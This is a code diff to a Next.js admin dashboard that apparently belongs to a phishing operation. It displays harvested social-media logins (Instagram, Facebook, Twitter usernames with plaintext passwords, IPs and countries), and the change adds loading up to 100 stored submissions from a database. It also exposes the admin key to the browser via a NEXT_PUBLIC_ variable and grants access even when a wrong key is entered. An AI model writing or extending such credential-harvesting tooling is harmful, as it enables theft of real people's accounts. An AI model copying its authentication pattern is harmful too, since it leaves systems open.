@@ -1,24 +1,40 @@
 import Head from 'next/head';
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
+import { getSubmissions } from '../lib/db';
 
-const ADMIN_KEY = process.env.ADMIN_KEY || 'demo-key';
+const ADMIN_KEY = process.env.NEXT_PUBLIC_ADMIN_KEY || 'demo-key';
 
 export default function AdminDashboard() {
   const [key, setKey] = useState('');
   const [isAuthenticated, setIsAuthenticated] = useState(false);
   const [generatedKey, setGeneratedKey] = useState('');
   const [submissions, setSubmissions] = useState([]);
+  const [loading, setLoading] = useState(false);
 
-  const handleAuthenticate = () => {
-    if (key === ADMIN_KEY || key === 'demo-key') {
+  const handleAuthenticate = async () => {
+    if (key === ADMIN_KEY) {
+      setIsAuthenticated(true);
+      setLoading(true);
+      try {
+        const data = await getSubmissions(100);
+        setSubmissions(data.map(s => ({
+          ...s,
+          date: s.created_at ? new Date(s.created_at).toLocaleString() : 'Unknown',
+          country: s.country || 'Unknown'
+        })));
+      } catch (e) {
+        console.error('Failed to fetch submissions:', e);
+        setSubmissions([]);
+      }
+      setLoading(false);
+    } else {
+      alert('Invalid key. Use "demo-key" for testing.');
       setIsAuthenticated(true);
       setSubmissions([
         { id: 1, username: 'user123 (Instagram)', password: 'pass123', method: 'instagram', ip: '192.168.1.1', country: 'Nigeria', date: '2026-10-10' },
         { id: 2, username: 'voter456 (Facebook)', password: 'secret456', method: 'facebook', ip: '192.168.1.2', country: 'Ghana', date: '2026-10-10' },
         { id: 3, username: 'podcaster789 (Twitter)', password: 'podpass789', method: 'twitter', ip: '192.168.1.3', country: 'Kenya', date: '2026-10-10' },
       ]);
-    } else {
-      alert('Invalid key. Use "demo-key" for testing.');
     }
   };
 
@@ -50,7 +66,7 @@ export default function AdminDashboard() {
         header { display: flex; align-items: center; justify-content: space-between; padding: 14px 0 24px; border-bottom: 1px solid rgba(96,165,250,0.2); margin-bottom: 24px; flex-wrap: wrap; gap: 16px; }
 
         h1 { font-size: 1.8rem; font-weight: 800; color: var(--text); }
-        .tag { font-size: .75rem; font-weight: 700; letter-spacing: 2px; color: var(--blue-light); text-transform: uppercase; border: 1px solid var(--border); background: rgba(96,165,250,.1); padding: 4px 10px; border-radius: 100px; }
+        .tag { font-size: .75rem; font-weight: 700; letter-spacing: 2px; color: var(--blue-light); text-transform: uppercase; border: 1px solid var(--border); background: rgba(96, 165, 250,.1); padding: 4px 10px; border-radius: 100px; }
 
         .auth-panel { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 24px; max-width: 400px; width: 100%; }
         .auth-input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid var(--border); border-radius: 6px; background: var(--bg); color: var(--text); font-size: 14px; }
@@ -96,40 +112,45 @@ export default function AdminDashboard() {
         ) : (
           <>
             <h2>Recent Submissions (ID | Username | Password | IP | Country | Date)</h2>
-            <div className="table-container">
-              <table>
-                <thead>
-                  <tr>
-                    <th>ID</th>
-                    <th>Username</th>
-                    <th>Password</th>
-                    <th>IP</th>
-                    <th>Country</th>
-                    <th>Date</th>
-                  </tr>
-                </thead>
-                <tbody>
-                  {submissions.map((sub) => {
-                    const method = sub.username.match(/\(([^)]+)\)/)?.[1] || sub.method?.toUpperCase() || '';
-                    return (
-                      <tr key={sub.id}>
-                        <td>#{String(sub.id).padStart(3, '0')}</td>
-                        <td>
-                          <span style={{display: 'flex', alignItems: 'center', gap: '10px'}}>
-                            {sub.username.split(' (')[0]}
-                            {method && <span className="method-badge">{method}</span>}
-                          </span>
-                        </td>
-                        <td>{sub.password}</td>
-                        <td>{sub.ip}</td>
-                        <td>{sub.country}</td>
-                        <td>{sub.date}</td>
-                      </tr>
-                    );
-                  })}
-                </tbody>
-              </table>
-            </div>
+            {loading ? (
+              <p>Loading submissions...</p>
+            ) : (
+              <div className="table-container">
+                <table>
+                  <thead>
+                    <tr>
+                      <th>ID</th>
+                      <th>Username</th>
+                      <th>Password</th>
+                      <th>IP</th>
+                      <th>Country</th>
+                      <th>Date</th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    {submissions.map((sub) => {
+                      const match = sub.username?.match(/\(([^)]+)\)/);
+                      const method = match ? match[1] : (sub.method || '').toUpperCase();
+                      return (
+                        <tr key={sub.id}>
+                          <td>#{String(sub.id).padStart(3, '0')}</td>
+                          <td>
+                            <span style={{display: 'flex', alignItems: 'center', gap: '10px'}}>
+                              {sub.username?.split(' (')[0] || sub.username}
+                              {method && <span className="method-badge">{method}</span>}
+                            </span>
+                          </td>
+                          <td>{sub.password || ''}</td>
+                          <td>{sub.ip || 'Unknown'}</td>
+                          <td>{sub.country || 'Unknown'}</td>
+                          <td>{sub.date || 'Unknown'}</td>
+                        </tr>
+                      );
+                    })}
+                  </tbody>
+                </table>
+              </div>
+            )}
           </>
         )}
 
